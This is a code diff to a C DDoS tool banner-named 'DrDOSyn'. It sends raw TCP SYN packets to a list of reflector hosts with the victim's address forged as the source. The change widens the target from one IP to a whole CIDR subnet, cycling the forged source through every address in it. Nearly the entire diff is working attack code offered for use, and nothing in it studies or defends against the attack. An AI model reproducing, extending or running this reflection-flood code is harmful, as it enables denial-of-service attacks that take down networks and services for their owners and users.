@@ -14,6 +14,9 @@
 #include <netdb.h>
 #include <net/if.h>
 #include <arpa/inet.h>
+#include <math.h>
+
+/*gcc -pthread drdCidr.c -o drdossyn -lm*/
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
@@ -66,7 +69,8 @@ struct thread_data
 {
 	int thread_id;
 	struct list *list_node;
-	struct sockaddr_in sin;
+	struct sockaddr_in *sins;
+	unsigned long num_ips;
 };
 
 void init_rand(unsigned long int x)
@@ -248,10 +252,8 @@ void *flood(void *par1)
 	struct iphdr *iph = (struct iphdr *)datagram;
 	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
 	struct tcpOptions *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
-	struct sockaddr_in sin = td->sin;
+	struct sockaddr_in *sins = td->sins;
 	struct list *list_node = td->list_node;
-	sin.sin_family = AF_INET;
-	sin.sin_port = htons(floodport);
 
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
@@ -265,7 +267,7 @@ void *flood(void *par1)
 	setup_ip_header(iph);
 	setup_tcp_header(tcph);
 	setup_tcpopts_header(opts);
-	iph->saddr = sin.sin_addr.s_addr;
+	iph->saddr = sins[0].sin_addr.s_addr;
 	iph->daddr = list_node->data.sin_addr.s_addr;
 	iph->check = csum((unsigned short *)datagram, iph->tot_len);
 
@@ -281,7 +283,7 @@ void *flood(void *par1)
 	init_rand(time(NULL));
 	register unsigned int i;
 	i = 0;
-
+	int sn_i = 0;
 	while (1)
 	{
 		opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
@@ -290,8 +292,8 @@ void *flood(void *par1)
 		tcph->check = 0;
 		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
 		tcph->dest = htons(ports[rand_cmwc() % 2]);
+		iph->saddr = sins[sn_i].sin_addr.s_addr;
 		list_node = list_node->next;
-		iph->saddr = sin.sin_addr.s_addr;
 		iph->daddr = list_node->data.sin_addr.s_addr;
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
@@ -299,6 +301,7 @@ void *flood(void *par1)
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 
+		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
 		if (floodport == 0)
 		{
 			tcph->source = htons(randnum(1, 65535));
@@ -314,18 +317,100 @@ void *flood(void *par1)
 			usleep(sleeptime);
 		}
 		i++;
+		sn_i++;
+		if (sn_i >= td->num_ips)
+		{
+			sn_i = 0;
+		}
 	}
 }
+void extractIpOctets(unsigned char *sourceString, short *ipAddress)
+{
+	unsigned short len = 0;
+	unsigned char oct[4] = {0}, cnt = 0, cnt1 = 0, i, buf[5];
 
+	len = strlen(sourceString);
+	for (i = 0; i < len; i++)
+	{
+		if (sourceString[i] != '.')
+		{
+			buf[cnt++] = sourceString[i];
+		}
+		if (sourceString[i] == '.' || i == len - 1)
+		{
+			buf[cnt] = '\0';
+			cnt = 0;
+			oct[cnt1++] = atoi(buf);
+		}
+	}
+	ipAddress[0] = oct[0];
+	ipAddress[1] = oct[1];
+	ipAddress[2] = oct[2];
+	ipAddress[3] = oct[3];
+}
+
+unsigned int ip2ui(char *ip)
+{
+	/* An IP consists of four ranges. */
+	long ipAsUInt = 0;
+	/* Deal with first range. */
+	char *cPtr = strtok(ip, ".");
+	if (cPtr)
+		ipAsUInt += atoi(cPtr) * pow(256, 3);
+
+	/* Proceed with the remaining ones. */
+	int exponent = 2;
+	while (cPtr && exponent >= 0)
+	{
+		cPtr = strtok(NULL, ".\0");
+		if (cPtr)
+			ipAsUInt += atoi(cPtr) * pow(256, exponent--);
+	}
+
+	return ipAsUInt;
+}
+
+char *ui2ip(unsigned int ipAsUInt)
+{
+	char *ip = malloc(16 * sizeof(char));
+	int exponent;
+	for (exponent = 3; exponent >= 0; --exponent)
+	{
+		int r = ipAsUInt / pow(256, exponent);
+		char buf[4];
+		sprintf(buf, "%d", r);
+		strcat(ip, buf);
+		strcat(ip, ".");
+		ipAsUInt -= r * pow(256, exponent);
+	}
+	/* Replace last dot with '\0'. */
+	ip[strlen(ip) - 1] = 0;
+	return ip;
+}
+
+unsigned int createBitmask(const char *bitmask)
+{
+	unsigned int times = (unsigned int)atol(bitmask) - 1, i, bitmaskAsUInt = 1;
+	/* Fill in set bits (1) from the right. */
+	for (i = 0; i < times; ++i)
+	{
+		bitmaskAsUInt <<= 1;
+		bitmaskAsUInt |= 1;
+	}
+	/* Shift in unset bits from the right. */
+	for (i = 0; i < 32 - times - 1; ++i)
+		bitmaskAsUInt <<= 1;
+	return bitmaskAsUInt;
+}
 int main(int argc, char *argv[])
 {
 	if (argc < 7)
 	{
 		fprintf(stdout, "DrDOSyn @cxmmand - netty\n");
-		fprintf(stdout, "Usage: %s [Target] [Port] [Threads] [PPS] [Time] [List]\n", argv[0]);
+		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List]\n", argv[0]);
 		exit(-1);
 	}
-
+	srand(time(NULL));
 	fprintf(stdout, "Preparing...\n");
 	int max_len = 128;
 	int i = 0;
@@ -369,16 +454,65 @@ int main(int argc, char *argv[])
 	struct list *current = head->next;
 
 	pthread_t thread[num_threads];
-	struct sockaddr_in sin;
-	sin.sin_family = AF_INET;
-	sin.sin_addr.s_addr = inet_addr(argv[1]);
+	char *ip, *bitmask;
+	ip = strtok(argv[1], "/");
+	if (!ip)
+	{
+		fprintf(stderr, "Error: Invalid IP address format.\n");
+		exit(-1);
+	}
+	bitmask = strtok(NULL, "\0");
+	if (!bitmask)
+	{
+		fprintf(stderr, "Error: Invalid CIDR notation.\n");
+		exit(-1);
+	}
+
+	unsigned int ipAsUInt = ip2ui(ip);
+	unsigned int mask_bits = (unsigned int)atol(bitmask);
+	unsigned int bitmaskAsUInt = createBitmask(bitmask);
+
+	char *networkAddress = ui2ip(ipAsUInt & bitmaskAsUInt),
+		 *broadcastAddress = ui2ip(ipAsUInt | ~bitmaskAsUInt);
+	unsigned long num_ips = 1;
+	for (i = 32; i > mask_bits; i--)
+	{
+		num_ips *= 2;
+	}
+
+	struct sockaddr_in *sins = malloc(num_ips * sizeof(struct sockaddr_in));
+	short network_octets[4], broadcast_octets[4];
+	extractIpOctets(networkAddress, network_octets);
+	extractIpOctets(broadcastAddress, broadcast_octets);
+	int ips = 0;
+
+	for (int a = network_octets[0]; a <= broadcast_octets[0]; a++)
+	{
+		for (int b = network_octets[1]; b <= broadcast_octets[1]; b++)
+		{
+			for (int c = network_octets[2]; c <= broadcast_octets[2]; c++)
+			{
+				for (int d = network_octets[3]; d <= broadcast_octets[3]; d++)
+				{
+					sins[ips].sin_family = AF_INET;
+					char ipAddr[16];								 // String for the currently generating IP
+					snprintf(ipAddr, 16, "%d.%d.%d.%d", a, b, c, d); // Format the IP string from the individual octets
+					sins[ips].sin_addr.s_addr = inet_addr(ipAddr);	 // Set the IP address as the packet source address for this socket
+					ips++;
+					// printf("%d: %s\n", ips, ipAddr);
+				}
+			}
+		}
+	}
+
 	int multiplier = 20;
 	struct thread_data td[num_threads];
 
 	for (i = 0; i < num_threads; i++)
 	{
 		td[i].thread_id = i;
-		td[i].sin = sin;
+		td[i].sins = sins;
+		td[i].num_ips = ips;
 		td[i].list_node = current;
 		pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
 	}
